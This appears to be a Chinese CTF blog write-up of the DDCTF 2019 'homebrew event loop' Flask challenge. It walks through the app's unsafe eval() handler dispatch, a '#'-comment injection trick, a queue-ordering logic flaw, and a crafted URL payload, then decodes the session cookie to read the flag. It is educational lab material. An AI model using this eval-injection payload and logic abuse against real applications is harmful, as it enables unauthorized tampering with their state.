<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
<p>这个开头 <strong><code>is_action = event[0] == 'a'</code></strong>  作用是什么，我们还不知道，先放着</p>
<p>下面两个我们可以看到有同一个函数 <strong><code>get_mid_str</code></strong></p>
<p>​    **<code> action = get_mid_str(event, ':', ';')</code> **</p>
<p>​      <strong><code>args = get_mid_str(event, action+';').split('#')</code></strong></p>
<p>在vscode里面跟进这个函数</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/15.png" alt="15"></p>
<p>这个函数的大概作用是</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/16.png" alt="16"></p>
<p><strong><code>action</code></strong>  是由实际作用，因为 **<code>eval</code> **  函数会用到，args函数不知道有啥用，大佬的wp是：返回列表到args里，所以很明显，我们上传的参数就是action开头，才能上传过来</p>
<p>大佬的wp更直观</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ACTION_handler</span>():</span><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">event = <span class="string">&#x27;action:ACTION;ARGS0#ARGS1#ARGS2&#x27;</span></span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] action:&#x27;</span>,action</span><br><span class="line">args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] args:&#x27;</span>,args</span><br><span class="line">event_handler = <span class="built_in">eval</span>(action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] event_handler:&#x27;</span>,event_handler</span><br></pre></td></tr></table></figure>
<p>看到第九行我们的event是这个样子，我们运行会得到什么？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[!] action: ACTION</span><br><span class="line">[!] args: [&#39;ARGS0&#39;, &#39;ARGS1&#39;, &#39;ARGS2&#39;]</span><br><span class="line">[!] event_handler: &lt;function ACTION_handler at 0x00000000035A4B38&gt;</span><br></pre></td></tr></table></figure>
<p><strong><code>  event_handler</code></strong>  函数就是用  <strong><code>eval</code></strong>  拼接，从而得到了处理函数， <strong><code>eveal</code> **  函数的本质就是将字符串str当成有效的表达式来求职并且返回计算结果，程序过滤了大部分的特殊符号，导致我们不能随意使用代码注入，不过由于 <strong><code>ARGS</code></strong>  使用 <strong><code>#</code></strong>  进行分割，而</strong><code>#</code> ** 在python代码中是注释符，在  <strong><code>action</code></strong>  中加入#，可以把后面的 <strong><code>_handler</code></strong>  注释掉。上面的代码用                              <strong><code>event = 'action:str#;ARGS0#ARGS1#ARGS2'</code></strong> 进行测试</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[!] action: str#</span><br><span class="line">[!] args: [&#39;ARGS0&#39;, &#39;ARGS1&#39;, &#39;ARGS2&#39;]</span><br><span class="line">[!] event_handler: &lt;type &#39;str&#39;&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p>其他没啥分析，我们找到可以控制的点</p>
<p>我们去找找如何得到falg（因为我们有eval执行函数）</p>
<p>我们看到FLAG函数是不带参数</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/17.png" alt="17"></p>
<p>现在，我们可以控制  <strong><code>event_handler</code></strong>  运行指定的函数，不过还有一个问题是FLAG()函数是不带参数，而 <strong><code>args</code></strong>  为**<code>list</code>** ，直接传入 <strong><code>action:FLAG</code></strong>  ，将产生报错</p>
<p>为什么其他参数不行？</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/18.png" alt="18"></p>
<p>这里是参数args的</p>
<p>那么没办法，只好分析源码,我们发现 <strong><code>show_flag_function</code></strong>  是没办法得到falg，因为return flag 被注释掉了，只是将它放到flag中。想要得到flag只能用**<code>get_flag_handler()</code>**可以得到flag，而得到flag的条件是是 <strong><code>if session['num_items'] &gt;= 5:</code></strong>  ，于是我们进入题目界面，去买钻石💎，发现最多买3个，不能买5个以及5个以上。<strong>我们看一下买钻石的函数</strong></p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/19.png" alt="19"></p>
<p>发现存在逻辑漏洞：就是我们的钱无论够不够，它都会给我们先加上，然后扣掉</p>
<p>我们发现第148行，无论我们的钱够不够，都先给我们加上，之后再扣掉</p>
<p>若让 <strong><code>eval()</code></strong>  去执行  <strong><code>trigger_event()</code></strong> ，并且在后面跟两个命令作为参数，分别是 <strong><code>buy</code></strong> 和 <strong><code>get_flag</code></strong> ，那么**<code>buy</code>**和  **<code>get_flag </code>**便先后进入队列。</p>
<p>根据顺序会先执行 <strong><code>buy_handler()</code></strong> ，此时 <strong><code>consume_point</code></strong> 进入队列，排在 <strong><code>get_flag</code></strong> 之后，我们的目标达成。</p>
<hr>
<p>我们构造plyadload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">action:trigger_event%<span class="number">23</span>;action:buy;<span class="number">5</span>%23action:get_flag;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/23.png" alt="23"></p>
<p>我们把得到的session放到KALI里面的flask-session-cookie-manager-master进行解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#39;session&#39;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/24.png" alt="24"></p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/25.png" alt="25"></p>
<p><strong>func:show_flag;flag{d07646de-b436-4966-ad68-fd2fc9d9764f}</strong>                         ❣️ ❣️  ❣️  ❣️ ​</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
        <tag>Flask模板注入</tag>
      </tags>
  </entry>
</search>
